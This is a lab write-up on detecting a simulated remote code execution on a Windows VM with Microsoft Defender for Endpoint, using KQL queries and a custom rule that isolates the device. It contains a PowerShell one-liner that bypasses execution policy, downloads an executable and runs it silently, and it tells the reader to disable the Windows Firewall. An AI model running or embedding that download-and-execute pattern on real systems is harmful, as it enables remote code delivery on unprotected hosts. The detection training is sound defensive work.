# 📝 RCE - Remote Code Execution Detection Report (Windows VM)


📌 Introduction

This report outlines the steps taken to detect and mitigate a Remote Code Execution (RCE) attack using Microsoft Defender for Endpoint (MDE) on a Windows Virtual Machine (VM). The lab involved creating an intermediate detection rule, executing a suspicious PowerShell command, triggering alerts, isolating the affected VM, and investigating the attack.
📋 Prerequisites

To complete this lab, the following are required:

- A Windows Virtual Machine (VM)

- Microsoft Defender for Endpoint (MDE) configured

- Microsoft Defender Security Portal Access (security.microsoft.com/machines)

🔥 Lab Execution Steps

1️⃣ Disabling Windows Firewall

To simulate a vulnerable system, the Windows Firewall is turned off:

Press Win + R, type wf.msc, and hit Enter.

Select Turn Windows Firewall on or off and disable it for all profiles.

- (Disabling the firewall allows attackers to discover the VM easily.)

2️⃣ Onboarding the VM to Microsoft Defender for Endpoint

1. Navigate to the MDE Portal: security.microsoft.com/machines

2. Confirm the VM is onboarded by verifying its status in the portal.

3. Verify logs are being generated using Advanced Hunting:

```
DeviceLogonEvents
| where DeviceName startswith "mydevice-"
| order by Timestamp desc
```
3️⃣ Creating a Detection Rule for RCE 🚨

A custom detection rule is created to detect PowerShell-based RCE attempts.

🛠️ Executing a Simulated Remote Code Execution Attack

Use PowerShell ISE to execute the following command:
```
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait" 
```
🕵️‍♂️ KQL Query for Detection

This query filters logs for Invoke-WebRequest and Start-Process execution:
```
let VMName = "my-vm-name";
DeviceProcessEvents
| where DeviceName == VMName
| where InitiatingProcessCommandLine contains "Invoke-WebRequest" and InitiatingProcessCommandLine contains "Start-Process"
```
🛑 Detection Rule Configuration
To create a detection rule, click the top right corner where it says "Create Detection Rule". You’ll then be taken to the screen where you can complete the Alert Details.
![Screenshot 2025-02-04 at 9 44 56 PM](https://github.com/user-attachments/assets/344d9905-d39c-4af2-bdbf-a81b46afb90b)
Impacted entities:
Define the impacted entities (in this case, the specific VM) for the detection rule.
![image](https://github.com/user-attachments/assets/2c691201-1b8d-4215-a33a-4351aadf7407)
Actions:
Choose the actions that should be taken when the detection rule is triggered. For this rule, we want to ensure that the VM is isolated and an investigation package is collected.
![Screenshot 2025-02-04 at 9 47 03 PM](https://github.com/user-attachments/assets/1a7a59fb-9619-41b8-aea9-4ddf62ed594a)
Summary:
![Screenshot 2025-02-04 at 9 56 19 PM](https://github.com/user-attachments/assets/94dd1a5d-6984-4d1d-9955-2da905f46994)


✔️ Isolate Device

✔️ Collect Investigation Package

4️⃣ Triggering the Alert & Isolating the VM

Execute the PowerShell command to generate logs.

Wait for alerts to appear in Advanced Hunting.

If isolation occurs, the rule has executed successfully.
![Screenshot 2025-02-04 at 10 32 24 PM](https://github.com/user-attachments/assets/0cc324c2-ce11-46a7-a4cc-48f1e7d8f0ef)

5️⃣ Investigating the Security Incident 🔍

Open Microsoft Defender Portal: security.microsoft.com/machines

Select the compromised VM and review the Action Center.

Examine logs using the following KQL query:
```
DeviceProcessEvents
| where DeviceName startswith "tou"
| where AccountName != "system"
| where InitiatingProcessCommandLine has_all ("Invoke-WebRequest", "Start-Process")
| order by Timestamp desc
```
(🔎 This filters logs for suspicious activity and excludes system processes.)

6️⃣ Resolving the Incident & Cleanup 🧹

Assign the alert to your user account and mark it as Resolved ✅.

Delete the detection rule 🚮.

Release the VM from isolation 🔓.

🔔 Conclusion

This lab demonstrated how to detect, contain, and investigate a Remote Code Execution attempt using Microsoft Defender for Endpoint. Proper security monitoring and custom detection rules ensure quick response to potential threats.
